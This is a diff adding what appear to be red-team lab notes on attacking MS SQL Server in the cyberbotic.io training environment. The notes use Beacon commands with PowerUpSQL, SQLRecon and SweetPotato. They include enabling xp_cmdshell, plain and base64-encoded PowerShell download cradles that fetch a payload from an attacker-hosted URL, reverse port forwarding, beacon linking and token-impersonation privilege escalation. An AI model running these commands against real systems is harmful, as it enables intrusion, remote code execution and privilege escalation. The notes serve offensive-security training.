@@ -1,0 +1,293 @@
+
+MS SQL Servers exploitation : 
+
+tools:
+https://github.com/NetSPI/PowerUpSQL
+https://github.com/skahwah/SQLRecon
+
+beacon> powershell-import C:\Tools\PowerUpSQL\PowerUpSQL.ps1
+beacon> powershell Get-SQLInstanceDomain
+
+ComputerName     : sql-2.dev.cyberbotic.io
+Instance         : sql-2.dev.cyberbotic.io,1433
+DomainAccountSid : 1500000521000672332383313895871914512914091400
+DomainAccount    : mssql_svc
+DomainAccountCn  : MS SQL Service
+Service          : MSSQLSvc
+Spn              : MSSQLSvc/sql-2.dev.cyberbotic.io:1433
+LastLogon        : 8/15/2022 7:55 PM
+Description      :
+
+
+#checks server is accessible or not
+beacon> powershell Get-SQLConnectionTest -Instance "sql-2.dev.cyberbotic.io,1433" | fl
+
+ComputerName : sql-2.dev.cyberbotic.io
+Instance     : sql-2.dev.cyberbotic.io,1433
+Status       : Accessible
+
+#It shows server info
+beacon> powershell Get-SQLServerInfo -Instance "sql-2.dev.cyberbotic.io,1433"
+
+#If there are multiple SQL Servers available, you can chain these commands together to automate the data collection.
+beacon> powershell Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" } | Get-SQLServerInfo
+
+*******SQLRECON TOOL ENUMERATION*******
+
+beacon> execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /enum:sqlspns
+
+beacon> execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /auth:wintoken /host:sql-2.dev.cyberbotic.io /module:info
+
+
+#The /auth:wintoken option allows SQLRecon to use the access token of the Beacon.  This output shows that whilst the database is accessible, our current user, bfarmer, is not a sysadmin.  SQLRecon has a nice module which can show us what roles we do have.
+
+beacon> execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io,1433 /m:whoami
+
+
+#check domain groups and members for sql enumeratin
+beacon> powershell Get-DomainGroup -Identity *SQL* | % { Get-DomainGroupMember -Identity $_.distinguishedname | select groupname, membername }
+
+NOTE:The credentials can be used with make_token in Beacon and /a:WinToken in SQLRecon; or the /a:WinDomain option with /d:<domain> /u:<username> /p:<password> in SQLRecon directly.
+
+
+#executing sqlqueries using powerupsql
+beacon> powershell Get-SQLQuery -Instance "sql-2.dev.cyberbotic.io,1433" -Query "select @@servername"
+
+#executing sqlqueries using sqlRecon tool
+beacon> execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io,1433 /m:query /c:"select @@servername"
+
+
+#mssqlclient.py from Impacket via proxychains:
+ubuntu@DESKTOP-3BSK7NO ~> proxychains mssqlclient.py -windows-auth DEV/bfarmer@10.10.122.25
+
+ NOTE:Or a Windows SQL GUI, such as HeidiSQL via Proxifier:
+
+============================================================================================================================================================================================================================
+
+MS SQL Impersonation:
+
+MS SQL impersonation, or context switching, is a means which allows the executing user to assume the permissions of another user without needing to know their password.  One handy use case for the feature is to allow administrators to impersonate a user for testing purposes, e.g. a user is having a problem and they want to eliminate permissions as an issue.
+
+
+beacon> execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io,1433 /m:impersonate
+
+[*] Enumerating accounts that can be impersonated on sql-2.dev.cyberbotic.io,1433
+name | 
+-------
+DEV\mssql_svc |
+
+
+##SQLRecon modules can also be run in "impersonation mode" by prefixing the module name with an i and specifying the principal to impersonate.checking for sysadmin privileges
+
+beacon> execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io,1433 /m:iwhoami /i:DEV\mssql_svc
+
+============================================================================================================================================================================================================================
+
+MS SQL Command Execution:
+
+#The xp_cmdshell procedure can be used to execute shell commands on the SQL server if you have sysadmin privileges.  Invoke-SQLOSCmd from PowerUpSQL provides a simple means of using it. //auto execute xpcmd shell if disabled
+
+beacon> powershell Invoke-SQLOSCmd -Instance "sql-2.dev.cyberbotic.io,1433" -Command "whoami" -RawResults
+
+#check status of xpcmdshell enabled or disabled (1,0)
+execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io,1433 /m:ienablexp /i:DEV\mssql_svc
+
+#after xpcndshell enabled check commands
+beacon> execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io,1433 /m:ixpcmd /i:DEV\mssql_svc /c:ipconfig
+
+NOTE:To spawn a proper beacon we use smb powershell payload as sqlserver directly dont communicate to teamserver so we host a payload and download using reverse port forwarding.
+
+##Next, host smb_x64.ps1 at /b on the team server.  We know SMB will work because we can validate that port 445 is open on the target SQL server.
+
+```
+beacon> run hostname
+wkstn-2
+
+beacon> getuid
+[*] You are DEV\bfarmer (admin)
+
+beacon> powershell New-NetFirewallRule -DisplayName "8080-In" -Direction Inbound -Protocol TCP -Action Allow -LocalPort 8080
+
+beacon> rportfwd 8080 127.0.0.1 80
+[+] started reverse port forward on 8080 to 127.0.0.1:80
+
+beacon> portscan 10.10.122.25 445 ##check sqlserver port 445 is open or not to execute a smb paylaod to spawn a beacon
+ 
+```
+
+beacon>powershell -w hidden -c "iex (new-object net.webclient).downloadstring('http://wkstn-2:8080/b')"
+
+or base64 encoded  and check event logs whether payload downloaded or not
+
+powershell -w hidden -enc aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AdwBrAHMAdABuAC0AMgA6ADgAMAA4ADAALwBiACcAKQA=
+
+beacon> link sql-2.dev.cyberbotic.io TSVCPIPE-ae2b7dc0-4ebe-4975-b8a0-06e990a41337  ##to spawn a beacon
+
+NOTE:What payload would you use if port 445 was closed?  Experiment with using the pivot listener here instead of SMB.
+
+============================================================================================================================================================================================================================
+
+MS SQL Lateral Movement:
+
+SQL Servers have a concept called "links", which allows a database instance to access data from an external source.  MS SQL supports multiple sources, including other MS SQL Servers.  These can also be practically anywhere - including other domains, forests or in the cloud.
+
+##This shows that SQL-2 has a link to SQL-1.  The SQLRecon links module could also be used.
+
+beacon> execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io,1433 /m:links
+
+[*] Additional SQL links on sql-2.dev.cyberbotic.io,1433
+name | product | provider | data_source | 
+------------------------------------------
+SQL-1.CYBERBOTIC.IO | SQL Server | SQLNCLI | SQL-1.CYBERBOTIC.IO |
+
+###We can also check the xp_cmdshell status.
+
+beacon> execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io,1433 /m:lquery /l:sql-1.cyberbotic.io /c:"select name,value from sys.configurations WHERE name = ''xp_cmdshell''"
+
+####If xp_cmdshell is disabled, you won't be able to enable it by executing sp_configure via OpenQuery.  If RPC Out is enabled on the link (which is not the default configuration), then you can enable it using the following syntax:
+
+```
+EXEC('sp_configure ''show advanced options'', 1; reconfigure;') AT [sql-1.cyberbotic.io]
+EXEC('sp_configure ''xp_cmdshell'', 1; reconfigure;') AT [sql-1.cyberbotic.io]
+
+```
+
+###We can query SQL-1 to find out if it has any further links.
+
+beacon> execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io,1433 /m:llinks /l:sql-1.cyberbotic.io
+
+###check sysadmin roles 
+beacon> execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:sql-2.dev.cyberbotic.io,1433 /m:lwhoami /l:sql-1.cyberbotic.io
+
+
+```
+beacon> run hostname
+sql-2
+
+beacon> getuid
+[*] You are DEV\mssql_svc (admin)
+
+beacon> powershell New-NetFirewallRule -DisplayName "8080-In" -Direction Inbound -Protocol TCP -Action Allow -LocalPort 8080
+
+beacon> rportfwd 8080 127.0.0.1 80
+[+] started reverse port forward on 8080 to 127.0.0.1:80
+
+```
+##use above technique to download a payload and execute in impersonation concept
+
+beacon> link sql-1.cyberbotic.io TSVCPIPE-ae2b7dc0-4ebe-4975-b8a0-06e990a41337  to spawn a beacon
+
+
+============================================================================================================================================================================================================================
+
+MS SQL Privilege Escalation:
+
+
+beacon> execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe TokenPrivileges
+
+
+###
+In a nutshell, this privilege allows the user to impersonate a token that it's able to get a handle to.  However, since this account is not a local admin, it can't just get a handle to a higher-privileged process (e.g. SYSTEM) already running on the machine.  A strategy that many authors have come up with is to force a SYSTEM service to authenticate to a rogue service that the attacker creates.  This rogue service is then able to impersonate the SYSTEM service whilst it's trying to authenticate.
+
+SweetPotato has a collection of these various techniques which can be executed via Beacon's execute-assembly command.
+
+
+beacon> execute-assembly C:\Tools\SweetPotato\bin\Release\SweetPotato.exe -p C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -a "-w hidden -enc aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AcwBxAGwALQAyAC4AZABlAHYALgBjAHkAYgBlAHIAYgBvAHQAaQBjAC4AaQBvADoAOAAwADgAMAAvAGMAJwApAA=="
+
+
+beacon> connect localhost 4444
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
